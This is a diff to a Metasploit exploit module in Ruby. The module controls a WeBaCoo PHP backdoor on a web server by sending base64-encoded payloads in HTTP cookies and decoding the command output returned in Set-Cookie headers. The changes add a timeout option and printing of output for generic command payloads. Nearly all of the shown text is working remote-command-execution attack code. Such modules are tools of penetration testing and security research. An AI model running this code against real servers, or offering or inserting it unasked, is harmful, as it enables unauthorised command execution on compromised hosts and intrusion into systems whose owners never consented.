@@ -47,18 +47,24 @@ class Metasploit3 < Msf::Exploit::Remote
 			[
 				OptString.new('URI', [ true, "WeBaCoo backdoor path", '/index.php']),
 				OptString.new('COOKIE', [ true, "Cookie name to use", 'M-Cookie']),
+				OptInt.new('TIMEOUT', [ true, "Connection timeout", 8]),
 			], self.class)
 	end
 
 	def check
 		uri = datastore['URI']
 		cookie = datastore['COOKIE']
+		timeout = datastore['TIMEOUT']
+
 		# generate a random string for a test echo command
 		rstr = rand_text_alphanumeric(6)
-		# base64 encode the test echo command
+
+		# base64 encode the command
 		command = Rex::Text.encode_base64("echo '#{rstr}'")
+
 		# random delimiter used to wrap the server's response
 		delim = rand_string 4
+
 		# form the cookie that will tranfer the payload
 		# details about backdoor communication model at:
 		# https://github.com/anestisb/WeBaCoo/wiki/Documentation
@@ -68,14 +74,16 @@ class Metasploit3 < Msf::Exploit::Remote
 			'method' => 'GET',
 			'uri' => uri,
 			'cookie' => cookie
-			}, 1)
+			}, timeout)
+
 		# server response validation
 		if response.code == 200
 			# retrieve the HTTP response cookie sets
 			res_cookie = URI.decode(response.headers['Set-Cookie'])
 			if res_cookie
-				# obtain the usefull encoded substring wrapped between delimiters
+				# obtain the command output substring wrapped between delimiters
                 		cmd_res = *(/#{delim}(.*)#{delim}/.match(res_cookie))
+
 				# decode command output
                 		cmd_res = Rex::Text.decode_base64(cmd_res[1]).chomp! unless cmd_res.nil?
 				if cmd_res == rstr
@@ -96,23 +104,51 @@ class Metasploit3 < Msf::Exploit::Remote
 	def exploit
 		uri = datastore['URI']
                 cookie = datastore['COOKIE']
+		timeout = datastore['TIMEOUT']
+		
 		print_status("Sending payload via HTTP header cookie")
+
 		# generate a random delimiter
 		delim = rand_string 4
+
 		# form the payload cookie carrier
                 cookie = "cm=" + Rex::Text.encode_base64(payload.encoded) + "; cn=#{cookie}; cp=#{delim}"
-		# HTTP connection options
-		opts = {
-                        'method'  => 'GET',
-                        'uri' => uri,
-                        'headers' => { 'Cookie' => cookie }
-                }
-		# connect to remote web server
-		con = connect(opts)
-		# send the request
-		con.send_request(con.request_raw(opts))
 
-		handler
+		# in case of custom command payload the server's response is captured and printed
+		if datastore['PAYLOAD'] == 'cmd/unix/generic'
+			# send the payload and get the server's response
+                	response = send_request_raw({
+                        'method' => 'GET',
+                        'uri' => uri,
+                        'cookie' => cookie
+                        }, timeout)
+                	if response.code == 200
+                        	# retrieve the HTTP response cookie sets
+                        	res_cookie = URI.decode(response.headers['Set-Cookie'])
+                        	if res_cookie
+                                	# obtain the command output substring wrapped between delimiters
+                                	cmd_res = *(/#{delim}(.*)#{delim}/.match(res_cookie))
+
+                                	# decode command output
+                                	cmd_res = Rex::Text.decode_base64(cmd_res[1]).chomp! unless cmd_res.nil?
+					print_status("Server responed with:\n#{cmd_res}")
+				end
+			end
+		# for other payloads the response is not usefull
+		else
+			# HTTP connection options
+			opts = {
+                        	'method'  => 'GET',
+                        	'uri' => uri,
+				'headers' => { 'Cookie' => cookie }
+                	}
+			# connect to remote web server
+			con = connect(opts)
+			# send the request
+			con.send_request(con.request_raw(opts))
+
+			handler
+		end
 	end
 
 	# Generate a random string with one base64 non-valid character
